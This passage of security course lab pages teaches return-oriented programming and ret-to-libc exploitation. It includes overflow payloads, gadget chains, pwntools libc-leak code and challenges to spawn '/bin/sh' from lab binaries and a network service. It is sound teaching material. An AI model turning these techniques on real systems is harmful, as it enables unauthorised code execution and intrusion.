&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804819c : ret 0x3e41
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804844e : ret 0xeac1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thus, the payload needed in order to call both &lt;code>overwatch&lt;/code> and &lt;code>warcraft&lt;/code> is the
one showcased below, with &lt;code>pop_ret_gadget_address&lt;/code> being set to &lt;code>0x08048331&lt;/code>
from the output above.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">offset&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span> &lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;A&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">pack&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">overwatch_address&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">pack&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">pop_ret_gadget_address&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">pack&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xdeadbeef&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">pack&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">warcraft_address&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice this yet is another example of &lt;strong>code reuse&lt;/strong> since we&amp;rsquo;re reusing various
chunks of instructions already present in our binary.&lt;/p>
&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;h3 id="01-tutorial---bypass-nx-stack-with-return-to-libc">01. Tutorial - Bypass NX Stack with return-to-libc&lt;/h3>
&lt;p>Go to the &lt;a href="activities/01-tutorial-ret-to-libc/src/">01-tutorial-ret-to-libc/&lt;/a>
folder.&lt;/p>
&lt;p>In the previous sessions we used stack overflow vulnerabilities to inject new
code into a running process (on its stack) and redirect execution to it. This
attack is easily defeated by making the stack, together with any other memory
page that can be modified, non-executable. This is achieved by setting the
&lt;strong>NX&lt;/strong> bit in the page table of the current process.&lt;/p>
&lt;p>We will try to bypass this protection for the &lt;code>01-tutorial-ret-to-libc/src/auth&lt;/code>
binary in the lab archive. For now, disable ASLR in the a new shell:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ setarch $(uname -m) -R /bin/bash
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s take a look at the program headers and confirm that the stack is no longer
executable. We only have read and write (RW) permissions for the stack area.
The auth binary requires the &lt;code>libssl1.0.0:i386&lt;/code> Debian package to work. You can
find &lt;code>libssl1.0.0:i386&lt;/code> Debian package
&lt;a href="https://packages.debian.org/jessie/i386/libssl1.0.0/download">here&lt;/a>.&lt;/p>
&lt;p>First, let&amp;rsquo;s check that &lt;em>NX&lt;/em> bit we mentioned earlier:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ checksec auth
[...]
NX: NX enabled
[...]
&lt;/code>&lt;/pre>&lt;p>For completeness, lets check that there is indeed a buffer (stack) overflow vulnerability.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ python2.7 -c &amp;#39;print &amp;#34;A&amp;#34; * 1357&amp;#39; | ltrace -i ./auth
TODO
&lt;/code>&lt;/pre>&lt;p>Check the source file - the buffer length is 1337 bytes. There should be a base
pointer and the &lt;code>main()&lt;/code>&amp;rsquo;s return address just before it on the stack. There is
also some alignment involved, but we can easily try a few lengths to get the
right position of the return address. Seems to be 1337 + 16 followed by the
return address for this case. You can, of course, determine the distance between
the buffer&amp;rsquo;s start address and the frame&amp;rsquo;s return address exactly using objdump,
but we will leave that as an exercise.&lt;/p>
&lt;p>We can now jump anywhere. Unfortunately, we cannot put a shellcode in the buffer
and jump into it because the stack is non-executable now. Lets try it with a few
&lt;code>NOP&lt;/code>s. Our buffer&amp;rsquo;s address is &lt;code>0xbfffee63&lt;/code> (see the &lt;code>gets()&lt;/code> call).&lt;/p>
&lt;pre tabindex="0">&lt;code>$ python2.7 -c &amp;#39;print &amp;#34;\x90\x90\x90\x90&amp;#34; + &amp;#34;A&amp;#34; * 1349 + &amp;#34;\x63\xee\xff\xbf&amp;#34;&amp;#39; | ltrace -i ./auth
[0x80484f1] __libc_start_main(0x80486af, 1, 0xbffff454, 0x80486c0, 0x8048730 &amp;lt;unfinished ...&amp;gt;
[0x8048601] malloc(20) = 0x0804b008
[0x80485df] puts(&amp;#34;Enter password: &amp;#34;Enter password:
) = 17
[0x80485ea] gets(0xbfffee63, 0x8048601, 0x80486af, 0xb7cdecb0, 0xb7cdecb7) = 0xbfffee63
[0x8048652] memset(0x0804b008, &amp;#39;\000&amp;#39;, 20) = 0x0804b008
[0x8048671] SHA1(0xbfffee63, 137, 0x804b008, 4, 0x90000001) = 0x804b008
[0xbfffee63] --- SIGSEGV (Segmentation fault) ---
[0xffffffff] +++ killed by SIGSEGV +++
&lt;/code>&lt;/pre>&lt;p>Guess what? It didn&amp;rsquo;t work&amp;hellip; How about we try to jump to some existing code?
First, let&amp;rsquo;s take a look at the &lt;code>check_password()&lt;/code> function.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -M intel -d auth | grep -A 15 &amp;#34;&amp;lt;check_password&amp;gt;:&amp;#34;
080485ec &amp;lt;check_password&amp;gt;:
80485ec: 55 push ebp
80485ed: 89 e5 mov ebp,esp
80485ef: 81 ec 58 05 00 00 sub esp,0x558
80485f5: c7 04 24 14 00 00 00 mov DWORD PTR [esp],0x14
80485fc: e8 9f fe ff ff call 80484a0 &amp;lt;malloc@plt&amp;gt;
8048601: a3 38 a0 04 08 mov ds:0x804a038,eax
8048606: a1 38 a0 04 08 mov eax,ds:0x804a038
804860b: 85 c0 test eax,eax
804860d: 75 18 jne 8048627 &amp;lt;check_password+0x3b&amp;gt;
804860f: c7 04 24 76 87 04 08 mov DWORD PTR [esp],0x8048776
8048616: e8 95 fe ff ff call 80484b0 &amp;lt;puts@plt&amp;gt;
804861b: c7 04 24 01 00 00 00 mov DWORD PTR [esp],0x1
8048622: e8 99 fe ff ff call 80484c0 &amp;lt;exit@plt&amp;gt;
8048627: 8d 85 bb fa ff ff lea eax,[ebp-0x545]
804862d: 89 04 24 mov DWORD PTR [esp],eax
&lt;/code>&lt;/pre>&lt;p>Lets try &lt;code>0x804860f&lt;/code> such that we print the &lt;code>malloc&lt;/code> failure message.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ python2.7 -c &amp;#39;print &amp;#34;A&amp;#34; * 1353 + &amp;#34;\x0f\x86\x04\x08&amp;#34;&amp;#39; | ltrace -i -e puts ./auth
[0x80485df] puts(&amp;#34;Enter password: &amp;#34;Enter password:
) = 17
[0x804861b] puts(&amp;#34;malloc failed&amp;#34;malloc failed
) = 14
[0xffffffff] +++ exited (status 1) +++
&lt;/code>&lt;/pre>&lt;h3 id="02-challenge---ret-to-libc">02. Challenge - ret-to-libc&lt;/h3>
&lt;p>So far, so good! Now let&amp;rsquo;s get serious and do something useful with this.&lt;/p>
&lt;p>Continue working in the &lt;code>01-tutorial-ret-to-libc/&lt;/code> folder in the activities
archive.&lt;/p>
&lt;p>The final goal of this task is to bypass the NX stack protection and call
&lt;code>system(&amp;quot;/bin/sh&amp;quot;)&lt;/code>. We will start with a simple ret-to-plt:&lt;/p>
&lt;ol>
&lt;li>Display all libc functions linked with the auth binary.&lt;/li>
&lt;li>Return to &lt;code>puts()&lt;/code>. Use ltrace to show that the call is actually being made.&lt;/li>
&lt;li>Find the offset of the &lt;code>&amp;quot;malloc failed&amp;quot;&lt;/code> static string in the binary.&lt;/li>
&lt;li>Make the binary print &lt;code>&amp;quot;failed&amp;quot;&lt;/code> the second time &lt;code>puts()&lt;/code> is called.&lt;/li>
&lt;li>&lt;strong>(bonus)&lt;/strong> The process should SEGFAULT after printing &lt;code>Enter password:&lt;/code>
again. Make it exit cleanly (the exit code does not matter, just no &lt;code>SIGSEGV&lt;/code>).
You can move on to the next task without solving this problem.&lt;/li>
&lt;li>Remember how we had ASLR disabled? The other libc functions are in the
memory, you just need to find their addresses. Find the offset of &lt;code>system()&lt;/code> in
libc. Find the offset of the &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string in libc.&lt;/li>
&lt;li>Where is libc linked in the auth binary? Compute the final addresses and call
&lt;code>system(&amp;quot;/bin/sh&amp;quot;)&lt;/code> just like you did with &lt;code>puts()&lt;/code>.&lt;/li>
&lt;/ol>
&lt;details>
&lt;summary>Hint 1&lt;/summary>
Use &lt;code>LD_TRACE_LOADED_OBJECTS=1 ./auth&lt;/code> instead of &lt;code>ldd&lt;/code>.
The latter is not always reliable, because the order in which it loads the
libraries might be different than when you actually run the binary.
&lt;/details>
&lt;details>
&lt;summary>Hint 2&lt;/summary>
When you finally attack this, &lt;code>stdin&lt;/code> will get closed and the new
shell will have nothing to read. Use &lt;code>cat&lt;/code> to concatenate your attack
string with &lt;code>stdin&lt;/code> like this:
&lt;code>cat &lt;(python -c 'print “L33T_ATTACK”') - | ./vulnbinary&lt;/code>.
&lt;p>Note the use of the &lt;code>-&lt;/code> (dash) character before the &lt;code>|&lt;/code>
(pipe). This prevents the closing of the input file descriptor of the pipe when
&lt;code>cat&lt;/code>&amp;rsquo;s output finished (i.e. when the &lt;code>EOF&lt;/code> character is
received).&lt;/p>
&lt;/details>
&lt;h3 id="03-challenge---no-ret-control">03. Challenge - no-ret-control&lt;/h3>
&lt;p>Go to the
&lt;a href="/activities/03-challenge-no-ret-control/src">03-challenge-no-ret-control/&lt;/a>
folder in the activities archive.&lt;/p>
&lt;p>Imagine this scenario: we have an executable where we can change at least 4
bytes of random memory, but ASLR is turned on. We cannot reliably change the
value of the return address because of this. Sometimes &lt;code>ret&lt;/code> is not even called
at the end of a function.&lt;/p>
&lt;p>Alter the execution of &lt;code>force_exit&lt;/code>, in order to call the secret function.&lt;/p>
&lt;h3 id="04-challenge---ret-to-plt">04. Challenge - ret-to-plt&lt;/h3>
&lt;p>Go to the &lt;a href="/activities/04-ret-to-plt/src">04-challenge-ret-to-plt/&lt;/a> folder in
the activities archive.&lt;/p>
&lt;p>&lt;code>random&lt;/code> is a small application that generates a random number.&lt;/p>
&lt;p>Your task is to build an exploit that makes the application always print the
same second random number. That is the first printed random number is whatever,
but the second printed random number will always be the same, for all runs. In
the sample output below the second printed random number is always &lt;code>1023098942&lt;/code>
for all runs.&lt;/p>
&lt;pre tabindex="0">&lt;code>hari@solyaris-home:~$ python2.7 -c &amp;#39;print &amp;lt;payload here&amp;gt;&amp;#39; | ./random
Hi! Options:
1. Get random number
2. Go outside
Here&amp;#39;s a random number: 2070249950. Have fun with it!
Hi! Options:
1. Get random number
2. Go outside
Here&amp;#39;s a random number: 1023098942. Have fun with it!
Segmentation fault (core dumped)
hari@solyaris-home:~$ python2.7 -c &amp;#39;print &amp;lt;payload here&amp;gt;&amp;#39; | ./random
Hi! Options:
1. Get random number
2. Go outside
Here&amp;#39;s a random number: 1152946153. Have fun with it!
Hi! Options:
1. Get random number
2. Go outside
Here&amp;#39;s a random number: 1023098942. Have fun with it!
&lt;/code>&lt;/pre>&lt;p>You can use the Python skeleton given in section &lt;a href="#nop-analogy">NOP Analogy&lt;/a> for
the buffer overflow input.&lt;/p>
&lt;p>&lt;strong>Bonus:&lt;/strong> The process should SEGFAULT after printing the second (constant)
number. Make it exit cleanly (the exit code does not matter, just no &lt;code>SIGSEGV&lt;/code>).&lt;/p>
&lt;h3 id="05-challenge---gadget-tutorial">05. Challenge - gadget tutorial&lt;/h3>
&lt;p>This task requires you to construct a payload using gadgets and calling the
functions inside such that it will print&lt;/p>
&lt;pre tabindex="0">&lt;code>Hello!
stage A!stage B!
&lt;/code>&lt;/pre>&lt;p>Make it also print the messages in reverse order:&lt;/p>
&lt;pre tabindex="0">&lt;code>Hello!
stage B!stage A!
&lt;/code>&lt;/pre>&lt;h3 id="06-bonus-challenge---echo-service">06. Bonus Challenge - Echo service&lt;/h3>
&lt;p>This task is a network service that can be exploited. Run it locally and try to
exploit it. You&amp;rsquo;ll find that if you call &lt;code>system(&amp;quot;/bin/sh&amp;quot;)&lt;/code> the shell is opened
in the terminal where the server was started instead of the one where the attack
takes place. This happens because the client-server communication takes place
over a socket. When you spawn a shell it will inherit the Standard I/O
descriptors from the parent and use those. To fix this you need to redirect the
socket fd into 0,1 (and optionally 2).&lt;/p>
&lt;p>So you will need to do the equivalent of the following, as part of a ROP chain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">dup2&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">sockfd&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">dup2&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">sockfd&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">system&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Exploit it first with ASLR disabled and then with it enabled.&lt;/p>
&lt;h2 id="conclusions">Conclusions&lt;/h2>
&lt;p>At the end of this session, you should:&lt;/p>
&lt;ul>
&lt;li>Understand the limitations of classic buffer overflow attacks, as well as
shellcodes.&lt;/li>
&lt;li>Understand and visualise the effect of various simple ROP attacks on a
program&amp;rsquo;s stack&lt;/li>
&lt;li>Be able to craft and make use of ROP chains in order to hack vulnerable
binaries&lt;/li>
&lt;/ul></description></item><item><title>Binary:</title><link>/binary/return-oriented-programming-advanced/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/return-oriented-programming-advanced/</guid><description>
&lt;h1 id="return-oriented-programming-advanced">Return Oriented Programming Advanced&lt;/h1>
&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="#return-oriented-programming-advanced">Return Oriented Programming Advanced&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#calling-conventions-in-the-rop-context">Calling Conventions in the ROP Context&lt;/a>&lt;/li>
&lt;li>&lt;a href="#rop-gadgets-on-x86_64">ROP gadgets on x86_64&lt;/a>&lt;/li>
&lt;li>&lt;a href="#libc-leaks">Libc leaks&lt;/a>&lt;/li>
&lt;li>&lt;a href="#challenges">Challenges&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#01-challenge---using-rop-to-leak-and-call-system">01. Challenge - Using ROP to Leak and Call system&lt;/a>&lt;/li>
&lt;li>&lt;a href="#02-challenge---handling-low-stack-space">02. Challenge - Handling Low Stack Space&lt;/a>&lt;/li>
&lt;li>&lt;a href="#03-challenge---stack-pivoting">03. Challenge - Stack Pivoting&lt;/a>&lt;/li>
&lt;li>&lt;a href="#04-challenge---mprotect">04. Challenge - mprotect&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#further-reading">Further Reading&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>In this lab we are going to dive deeper into &lt;em>Return Oriented Programming&lt;/em> and setbacks that appear in modern exploitation. Topics covered:&lt;/p>
&lt;ul>
&lt;li>ROP for syscalls and 64 bits&lt;/li>
&lt;li>Dealing with ASLR in ROP&lt;/li>
&lt;li>Dealing with low space in the overflown buffer&lt;/li>
&lt;li>Combining ROP and shellcodes&lt;/li>
&lt;/ul>
&lt;p>As the basis of the lab we will use a program based on a classical CTF challenge called &lt;em>ropasaurusrex&lt;/em> and gradually make exploitation harder.&lt;/p>
&lt;h2 id="calling-conventions-in-the-rop-context">Calling Conventions in the ROP Context&lt;/h2>
&lt;p>As you know, the calling convention for 32 bits uses the stack. This means that setting up parameters is as easy as just writing them in the payload.&lt;/p>
&lt;p>We can see how a function call is generated in this &lt;a href="https://gcc.godbolt.org/z/MPG5MhEnE">Compiler Explorer example&lt;/a>.&lt;/p>
&lt;p>Syscalls are special, the arguments are passed using the registers and &lt;code>int 0x80&lt;/code> or the equivalent &lt;code>call DWORD PTR gs:0x10&lt;/code> is used such that more work is needed: &lt;code>pop ?; ret&lt;/code> gadgets are needed to load the registers with the desired values.&lt;/p>
&lt;p>In the assembly below you see a disassembly of the calling of a system call &lt;code>read(0, 0x8048000, 0x100)&lt;/code>, with the system call in the &lt;code>eax&lt;/code> register and the system call arguments in the other registers:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">eax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">ebx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">ecx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x08048000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">edx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x100&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">int&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x80&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The calling convention for 64 bit processors (&lt;code>x86_64&lt;/code>) is different and mainly uses registers instead of the stack, see this &lt;a href="https://gcc.godbolt.org/z/1Ys6M3Pdc">Compiler Explorer example&lt;/a>.&lt;/p>
&lt;p>Syscalls on 64 bits are conceptually the same as on 32 bits, but it uses different registers, different syscall codes and the &lt;code>syscall&lt;/code> mnemonic is used for making a system call:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rdi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rsi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x08048000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rdx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x100&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">syscall&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rop-gadgets-on-x86_64">ROP gadgets on x86_64&lt;/h2>
&lt;p>On &lt;code>x86_64&lt;/code> the ROP payloads will have to be built differently than on &lt;code>x86&lt;/code> because of the different calling convention. Having the function arguments stored in registers means that you don&amp;rsquo;t need to do stack cleanup anymore, but you will need gadgets with &lt;strong>specific registers&lt;/strong> to pop the arguments into.&lt;/p>
&lt;p>For example to do the &lt;code>read(0, buf, size)&lt;/code> &lt;em>libc call&lt;/em> to do this call your payload will need to look like:&lt;/p>
&lt;pre tabindex="0">&lt;code>pop rdi; ret
0
pop rsi, ret
buf_addr
pop rdx; ret
size
call read@plt
&lt;/code>&lt;/pre>&lt;h2 id="libc-leaks">Libc leaks&lt;/h2>
&lt;p>You might have already encountered in other tasks the need to leak values or addresses. Most of the time, if you want to get a shell, you won&amp;rsquo;t have a convenient &lt;code>system@plt&lt;/code> symbol present in your binary, and ASLR will most often be activated; so you will have to compute it relative to another libc symbol at runtime.&lt;/p>
&lt;p>For this we will need to know what libc library the program is loading. For a local executable we can just run &lt;code>ldd&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ldd rop
linux-vdso.so.1 (0x00007ffd0834b000)
libc.so.6 =&amp;gt; /usr/lib/libc.so.6 (0x00007fec18eb6000)
/lib64/ld-linux-x86-64.so.2 =&amp;gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fec190aa000)
&lt;/code>&lt;/pre>&lt;p>For remote tasks you can might get an attached &lt;code>libc.so&lt;/code>, or you can use the &lt;a href="https://libc.blukat.me/">Libc database&lt;/a> to find the correct libc based on some leaked offsets.&lt;/p>
&lt;p>How to compute and use the &lt;code>system&lt;/code> function address using pwntools:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">from&lt;/span> &lt;span style="color:#000">pwn&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">libc&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">ELF&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;/usr/lib/libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># from `ldd rop`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">p&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">process&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;rop&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># read the leaked address of the write@got function from the program&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">write_leak&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">u64&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">p&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">recv&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">8&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># compute the starting address of the libc library&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># setting libc.address to this value will offset all future symbol accesses&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">libc&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">address&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">write_leak&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span> &lt;span style="color:#000">libc&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">symbols&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;write&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># use the address of system in the payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">...&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#000">p64&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">libc&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">symbols&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;p>&lt;strong>NOTE&lt;/strong>: All tasks from this session are 64 bit binaries, so take that into consideration when you build the ROP chains.&lt;/p>
&lt;h3 id="01-challenge---using-rop-to-leak-and-call-system">01. Challenge - Using ROP to Leak and Call system&lt;/h3>
&lt;p>Use the &lt;code>01-leak-call-system/src&lt;/code> executable file in order to spawn a shell.&lt;/p>
&lt;p>You can now call the functions in the binary but &lt;code>system&lt;/code> or any other appropriate function is missing and ASLR is enabled. How do you get past this? You need an information leak! To leak information we want to print it to standard output and process it.
We use calls to &lt;code>printf&lt;/code>, &lt;code>puts&lt;/code> or &lt;code>write&lt;/code> for this. In our case we can use the &lt;code>write&lt;/code> function call.&lt;/p>
&lt;blockquote>
&lt;p>If you have a string representation of a number you can unpack it using the &lt;code>unpack&lt;/code>/&lt;code>u64&lt;/code> function in pwntools. It is the reverse of the &lt;code>pack&lt;/code>/&lt;code>p64&lt;/code> function.&lt;/p>
&lt;/blockquote>
&lt;p>First, trigger the information leak by calling the &lt;code>write&lt;/code> function and leaking an address from libc.&lt;/p>
&lt;blockquote>
&lt;p>You can use the GOT table storing libc addresses.&lt;/p>
&lt;/blockquote>
&lt;p>You need to read the output from the above &lt;code>write&lt;/code> call. Use &lt;code>p.recv(8)&lt;/code> in the Python script to read the 8 bytes output of the &lt;code>write&lt;/code> call in the ROP chain.&lt;/p>
&lt;blockquote>
&lt;p>Remember that you need gadgets to pop values into rdi, rsi, rdx for the &lt;code>write&lt;/code> call.&lt;/p>
&lt;/blockquote>
&lt;p>Find the address of the &lt;code>system&lt;/code> call.&lt;/p>
&lt;blockquote>
&lt;p>Remember the libc leaks section above&lt;/p>
&lt;/blockquote>
&lt;p>Call &lt;code>system&lt;/code>.&lt;/p>
&lt;blockquote>
&lt;p>You can&amp;rsquo;t write the &lt;code>system&lt;/code> address in the ROP chain as it is different each time and the ROP chain is statically defined. You can use the GOT table again. Write an entry in the GOT table with the newly found address and call the function for that entry. It will evolve into a call to &lt;code>system&lt;/code>.&lt;/p>
&lt;p>To write an entry in the GOT table use the &lt;code>read&lt;/code> call in the ROP chain. You will feed to &lt;code>read&lt;/code> the computed address below.&lt;/p>
